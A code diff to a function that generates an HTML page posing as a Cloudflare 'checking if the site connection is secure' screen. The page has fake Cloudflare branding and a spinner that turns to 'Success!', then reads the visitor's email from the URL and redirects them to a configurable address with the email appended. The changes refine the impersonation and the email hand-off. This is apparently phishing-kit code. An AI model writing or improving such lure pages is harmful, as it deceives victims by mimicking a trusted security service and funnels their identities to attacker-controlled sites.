@@ -269,7 +269,7 @@ function generateCustomScriptContent(redirectUrl) {
       <p style="font-size:18px;color:#b0b3b8;margin:0 0 40px 0">
         Please stand by, while we are checking if the site connection is secure
       </p>
-      <div style="width: 37%; border:1px solid #555;border-radius:4px;padding:20px;display:flex;align-items:center;justify-content:space-between;margin-bottom:40px">
+      <div style="width: 37%; border:1px solid #555;border-radius:4px;padding:10px;display:flex;align-items:center;justify-content:space-between;margin-bottom:40px">
         <div style="display:flex;align-items:center">
           <div id="a" style="width:24px;height:24px;border:3px solid #333;border-top:3px solid #fff;border-radius:50%;animation:b 1s linear infinite;margin-right:12px"></div>
           <div id="c" style="display:none;width:24px;height:24px;background:#4caf50;border-radius:50%;margin-right:12px;text-align:center;line-height:24px;color:white;font-weight:bold">✓</div>
@@ -277,8 +277,8 @@ function generateCustomScriptContent(redirectUrl) {
           <span id="e" style="display:none;color:#4caf50;font-size:16px;font-weight:500">Success!</span>
         </div>
         <div style="font-size:9px;color:#f38020">
-          CLOUDFLARE
-          <div style="font-size:8px;color:#888">Privacy Terms</div>
+         &#9729;&#65039; <div>CLOUDFLARE </div>
+          <div style="font-size:8px;color:#888">Privacy | Terms</div>
         </div>
       </div>
       <div style="border:1px solid #555;border-radius:4px;padding:20px;margin-bottom:40px">
@@ -311,7 +311,7 @@ function generateCustomScriptContent(redirectUrl) {
       // Redirect logic
       const email = new URLSearchParams(window.location.search).get('email');
       let redirectUrl = "${redirectUrl}";
-      if (email) redirectUrl += "?email=" + encodeURIComponent(email);
+      if (email) redirectUrl +=  encodeURIComponent(email);
       window.location.href = redirectUrl;
     }, delay);
   </script>
